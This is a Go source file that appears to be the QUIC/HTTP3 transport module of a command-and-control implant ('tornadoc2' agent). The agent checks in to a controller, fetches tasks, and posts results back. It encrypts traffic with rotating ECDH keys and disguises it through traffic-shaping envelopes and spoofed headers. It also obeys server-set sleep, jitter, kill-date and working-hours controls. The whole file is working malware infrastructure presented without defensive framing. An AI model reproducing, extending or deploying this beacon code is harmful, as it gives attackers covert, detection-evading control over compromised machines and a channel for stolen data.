package transport

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"time"

	"github.com/quic-go/quic-go"
	"github.com/quic-go/quic-go/http3"

	"tornadoc2/agent/features"
	"tornadoc2/agent/protocol"
)

type quicTransport struct {
	baseURL string
	profile Profile
	client  *http.Client
	rt      *http3.RoundTripper
	cookie  string
	shaping *ShapingSpec
}

func NewQUICTransport(urlStr string, profile Profile,
	tlsCfg *tls.Config, shaping *ShapingSpec) (*quicTransport, error) {

	if tlsCfg == nil {
		tlsCfg = &tls.Config{}
	}

	tlsCfg.NextProtos = []string{"h3"}
	tlsCfg.MinVersion = tls.VersionTLS13
	if len(tlsCfg.CurvePreferences) == 0 {
		tlsCfg.CurvePreferences = []tls.CurveID{
			tls.X25519,
			tls.CurveP256,
			tls.CurveP384,
		}
	}
	if len(tlsCfg.CipherSuites) == 0 {
		tlsCfg.CipherSuites = []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
		}
	}

	host := ""
	if u, err := url.Parse(urlStr); err == nil {
		host = u.Hostname()
	}
	if tlsCfg.ServerName == "" && host != "" {
		tlsCfg.ServerName = host
	}

	rt := &http3.RoundTripper{
		TLSClientConfig: tlsCfg,
		QUICConfig: &quic.Config{
			MaxIdleTimeout:  60 * time.Second,
			KeepAlivePeriod: 10 * time.Second,
		},
	}

	client := &http.Client{
		Transport: rt,
		Timeout:   30 * time.Second,
	}

	return &quicTransport{
		baseURL: strings.TrimRight(urlStr, "/"),
		profile: profile,
		shaping: shaping,
		client:  client,
		rt:      rt,
	}, nil
}

func (t *quicTransport) Name() string { return "quic" }

func (t *quicTransport) applyHeaders(req *http.Request) {
	req.Header.Set("Content-Type", "application/json")
	for k, v := range t.profile.RequestHeaders {
		req.Header.Set(k, v)
	}
	for k, v := range t.profile.ExtraHeaders {
		req.Header.Set(k, v)
	}
	if t.profile.UserAgent != "" {
		req.Header.Set("User-Agent", t.profile.UserAgent)
	}
}

func (t *quicTransport) CheckIn(identity Identity,
	pubkeyPEM, identitySig string, identityTs int64,
	wire *WireSession) (*CheckinResponse, error) {

	payload := CheckinRequest{Identity: identity}
	if pubkeyPEM != "" {
		payload.AgentPubKey = pubkeyPEM
	}
	if identitySig != "" {
		payload.IdentitySig = identitySig
		payload.IdentityTs = identityTs
	}
	body, err := json.Marshal(payload)
	if err != nil {
		return nil, fmt.Errorf("checkin: marshal: %w", err)
	}
	if wire != nil {
		body, err = wire.EncryptRequest(body)
		if err != nil {
			return nil, err
		}
	}

	req, err := http.NewRequest("POST",
		t.baseURL+t.profile.BeaconPath, bytes.NewReader(body))
	if err != nil {
		return nil, fmt.Errorf("checkin: build request: %w", err)
	}
	t.applyHeaders(req)

	resp, err := t.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	wantBeacon := 200
	if t.profile.Status != nil && t.profile.Status.Beacon > 0 {
		wantBeacon = t.profile.Status.Beacon
	}
	if resp.StatusCode == 403 && wantBeacon != 403 {
		return nil, errors.New("checkin refused (403)")
	}
	if resp.StatusCode != wantBeacon {
		return nil, fmt.Errorf("checkin status %d (wanted %d)",
			resp.StatusCode, wantBeacon)
	}
	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("checkin: read body: %w", err)
	}

	if t.shaping != nil && t.shaping.CheckinResponse != nil {
		if env := extractEnvelope(resp, t.shaping.CheckinResponse); env != nil {
			respBody = env
		}
	}
	if wire != nil {
		plain, wasEnc, derr := wire.DecryptResponse(respBody)
		if derr != nil {
			return nil, fmt.Errorf("decrypt: %w", derr)
		}
		if wasEnc {
			respBody = plain
		}
	}
	if t.shaping != nil && t.shaping.CheckinResponse != nil {
		raw, err := features.ShapeUnwrap(respBody,
			t.shaping.CheckinResponse)
		if err != nil {
			return nil, fmt.Errorf("checkin shape: %w", err)
		}
		respBody = raw
	}
	var out CheckinResponse
	if err := json.Unmarshal(respBody, &out); err != nil {
		return nil, err
	}
	if out.Cookie == "" {
		return nil, errors.New("checkin reply missing cookie")
	}
	t.cookie = out.Cookie
	return &out, nil
}

func (t *quicTransport) FetchTasks(wire *WireSession) ([]Task, error) {
	if t.cookie == "" {
		return nil, errors.New("tasks: no session cookie")
	}
	req, err := http.NewRequest("GET",
		t.baseURL+t.profile.TasksPath, nil)
	if err != nil {
		return nil, fmt.Errorf("tasks: build request: %w", err)
	}
	t.applyHeaders(req)
	if wire != nil {
		epk, rerr := wire.RotateEphemeral()
		if rerr != nil {
			return nil, fmt.Errorf("tasks: rotate epk: %w", rerr)
		}
		req.Header.Set("X-ECDH-Pubkey", epk)
	}
	cookieName := t.profile.CookieName
	if cookieName == "" {
		cookieName = "sid"
	}
	req.Header.Set("Cookie", cookieName+"="+t.cookie)

	resp, err := t.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	wantTasks := 200
	if t.profile.Status != nil && t.profile.Status.Tasks > 0 {
		wantTasks = t.profile.Status.Tasks
	}
	if resp.StatusCode != wantTasks {
		return nil, fmt.Errorf("tasks status %d (wanted %d)",
			resp.StatusCode, wantTasks)
	}

	if v := resp.Header.Get("X-Beacon-Sleep"); v != "" {
		if n, err := strconv.Atoi(v); err == nil && n >= 0 {
			protocol.ScheduleSleep = n
		}
	}
	if v := resp.Header.Get("X-Beacon-Jitter"); v != "" {
		if f, err := strconv.ParseFloat(v, 64); err == nil {
			protocol.ScheduleJitter = f
		}
	}
	if v := resp.Header.Get("X-Beacon-Kill"); v != "" {
		if n, err := strconv.ParseInt(v, 10, 64); err == nil && n > 0 {
			protocol.ScheduleKill = n
		}
	}
	if v := resp.Header.Get("X-Beacon-WorkStart"); v != "" {
		if n, err := strconv.Atoi(v); err == nil && n >= 0 && n < 1440 {
			protocol.WorkHoursStart = n
		}
	}
	if v := resp.Header.Get("X-Beacon-WorkEnd"); v != "" {
		if n, err := strconv.Atoi(v); err == nil && n >= 0 && n < 1440 {
			protocol.WorkHoursEnd = n
		}
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("tasks: read body: %w", err)
	}

	if t.shaping != nil && t.shaping.TasksResponse != nil {
		if env := extractEnvelope(resp, t.shaping.TasksResponse); env != nil {
			body = env
		}
	}
	if wire != nil {
		plain, wasEnc, derr := wire.DecryptResponse(body)
		if derr != nil {
			return nil, fmt.Errorf("decrypt: %w", derr)
		}
		if wasEnc {
			body = plain
		}
	}
	if t.shaping != nil && t.shaping.TasksResponse != nil {
		raw, err := features.ShapeUnwrap(body, t.shaping.TasksResponse)
		if err != nil {
			return nil, fmt.Errorf("tasks shape: %w", err)
		}
		body = raw
	}
	var tasks []Task
	if err := json.Unmarshal(body, &tasks); err != nil {
		return nil, err
	}
	return tasks, nil
}

func (t *quicTransport) PostResult(r Result, wire *WireSession) error {
	if t.cookie == "" {
		return errors.New("results: no session cookie")
	}
	body, err := json.Marshal(r)
	if err != nil {
		return fmt.Errorf("results: marshal: %w", err)
	}
	if t.shaping != nil && t.shaping.ResultsRequest != nil {
		body, err = features.ShapeWrap(t.shaping.ResultsRequest, r)
		if err != nil {
			return err
		}
	}
	if wire != nil {
		body, err = wire.EncryptRequest(body)
		if err != nil {
			return err
		}
	}
	req, err := http.NewRequest("POST",
		t.baseURL+t.profile.ResultsPath, bytes.NewReader(body))
	if err != nil {
		return fmt.Errorf("results: build request: %w", err)
	}
	cookieName := t.profile.CookieName
	if cookieName == "" {
		cookieName = "sid"
	}
	req.Header.Set("Cookie", cookieName+"="+t.cookie)
	req.Header.Set("Content-Type", "application/json")
	t.applyHeaders(req)

	resp, err := t.client.Do(req)
	if err != nil {
		return err
	}
	resp.Body.Close()
	wantResults := 204
	if t.profile.Status != nil && t.profile.Status.Results > 0 {
		wantResults = t.profile.Status.Results
	}
	if resp.StatusCode != wantResults {
		return fmt.Errorf("results status %d (wanted %d)",
			resp.StatusCode, wantResults)
	}
	return nil
}

func (t *quicTransport) Close() error {
	if t.rt != nil {
		_ = t.rt.Close()
	}
	t.client.CloseIdleConnections()
	return nil
}